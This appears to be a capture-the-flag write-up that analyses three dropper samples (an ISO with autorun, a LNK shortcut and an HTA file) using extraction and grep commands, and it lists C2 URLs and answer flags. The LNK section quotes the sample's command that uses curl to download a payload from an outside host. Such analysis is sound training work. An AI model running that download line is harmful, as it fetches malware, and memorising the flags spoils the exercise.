# Dropper

## icg4200.iso
```bash
python3 -c "d=open('icg4200.iso','rb').read()[0x8000:];print(d[8:40],d[40:72],d[318:446],d[446:574],d[574:702])"  # sys/vol/pub/prep/app
7z x -oiso icg4200.iso; cat iso/autorun.inf iso/channel.txt; sha256sum iso/update.bin
```
Volume ICG4200 · System TN-FIN-WS042 · Publisher IndusCom · Preparer ops.cardoso ·
Application ObsidianUpdater/2.1 · autorun open=update.bin · hash d511...280b · C2 .../v1/heartbeat · **CTF{iso_icg4200_relay}**

## dns.lnk (parser manual do LNK)
```python
# LinkInfo -> LocalBasePath C:\Windows\System32\cmd.exe ; DriveSerial 4C4D-4453
# StringData: name "IndusCom DNS window", workdir C:\Users\Public,
# args "/c curl http://induscom-secure.net/litoral-dns -o dns-update.bin"
# MachineID LIT-NMS-02 ; strings -el -> CTF{lnk_dns_relay}
```

## clm-login.hta
```bash
grep -oE '<HTA:APPLICATION[^>]*>' clm-login.hta   # ID CLMClient APPLICATIONNAME IndusComCLM SHOWINTASKBAR no
grep -oE 'var [a-z0-9]+="[^"]*"' clm-login.hta     # host CLM-MESA-014, ua CLMClient/3.4, url .../clm-login, c2 .../v1/heartbeat
# var enc (base64) -> "Drop: clm-agent.bin\nFlag: CTF{hta_clm_relay}"
```
